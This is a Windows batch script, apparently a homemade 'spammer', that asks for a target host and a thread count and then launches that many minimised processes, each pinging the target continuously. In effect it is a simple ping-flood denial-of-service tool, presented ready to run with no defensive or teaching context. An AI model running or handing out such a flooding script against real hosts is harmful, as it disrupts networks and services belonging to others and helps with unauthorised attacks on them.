@echo off
set /p max="Maximum Thread count: "
set /p deley="Time between starts: "
goto host
:rehost
echo ** Host not reachable **
:host
set /p host="The host to spam: "
ping %host% -n 1 >nul 2>nul || goto rehost
set /a i=1
set /a deley=%deley%+1
:loop
cls
echo Starting Spammer
echo Current Thread: %i%/%max%
start /min "PingThread #%i%" ping %host% /t
ping localhost /n %deley% >nul
if %i%==%max% (goto done)
set /a i=%i%+1
goto loop
:done
echo All threads started!
echo.
pause